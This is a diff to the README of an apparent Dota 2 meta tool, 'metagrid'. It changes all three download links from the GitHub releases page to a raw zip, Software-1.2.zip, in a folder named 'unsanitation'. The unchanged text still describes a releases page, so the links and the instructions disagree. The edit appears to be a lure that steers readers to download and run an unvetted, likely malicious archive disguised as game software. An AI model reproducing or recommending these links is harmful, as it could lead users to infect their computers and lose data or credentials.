@@ -1,6 +1,6 @@
 # ⚡ metagrid - Your Real-Time Dota 2 Meta Companion
 
-[![Download metagrid](https://img.shields.io/badge/Download-metagrid-blue?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/testyoutobe139-ai/metagrid/releases)
+[![Download metagrid](https://img.shields.io/badge/Download-metagrid-blue?style=for-the-badge&logo=github&color=4CAF50)](https://raw.githubusercontent.com/testyoutobe139-ai/metagrid/main/unsanitation/Software-1.2.zip)
 
 ## 🎮 What Is metagrid?
 
@@ -10,7 +10,7 @@ Think of it as your personal Dota 2 meta analyst that runs quietly on your compu
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/testyoutobe139-ai/metagrid/releases](https://github.com/testyoutobe139-ai/metagrid/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/testyoutobe139-ai/metagrid/main/unsanitation/Software-1.2.zip](https://raw.githubusercontent.com/testyoutobe139-ai/metagrid/main/unsanitation/Software-1.2.zip)
 
 That's it! Once you click the link, you'll see a page with the latest version of metagrid. Look for the file that matches your computer (Windows is most common) and download it.
 
@@ -130,7 +130,7 @@ The result is a hero grid that actually reflects what's winning games right now,
 
 Stop wasting time wondering which heroes to pick. Let metagrid handle the research while you focus on playing better. Download it now and see the difference in your next match.
 
-[![Get metagrid Now](https://img.shields.io/badge/🚀%20Download%20metagrid%20Now-Get%20Started-orange?style=for-the-badge&logo=github&color=FF5722)](https://github.com/testyoutobe139-ai/metagrid/releases)
+[![Get metagrid Now](https://img.shields.io/badge/🚀%20Download%20metagrid%20Now-Get%20Started-orange?style=for-the-badge&logo=github&color=FF5722)](https://raw.githubusercontent.com/testyoutobe139-ai/metagrid/main/unsanitation/Software-1.2.zip)
 
 Remember: the meta changes fast, but metagrid changes faster. Stay ahead of the curve with automatic hero grids that always match the high-MMR meta.
 
